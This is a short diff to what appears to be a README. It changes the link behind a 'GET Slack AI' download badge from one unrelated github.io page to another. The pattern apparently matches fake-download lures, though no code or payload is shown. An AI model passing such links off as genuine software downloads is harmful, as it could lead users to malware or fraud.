@@ -2,7 +2,7 @@
 
 ![Banner Placeholder](https://avatars.mds.yandex.net/i?id=7792f06d7f66ec7a329cc572180b4c1c5fa29d66-13017849-images-thumbs&n=13)
 
-[![GET Slack AI](https://img.shields.io/badge/GET%20%E2%80%94%20Slack%20AI-4A154B?style=for-the-badge&logoColor=white)](https://tpm-health-diagnostic-tools.github.io/.github/slack-ai-search)
+[![GET Slack AI](https://img.shields.io/badge/GET%20%E2%80%94%20Slack%20AI-4A154B?style=for-the-badge&logoColor=white)](https://chasepersonzvvs.github.io/.github/slack-ai-search)
 
 ---
 
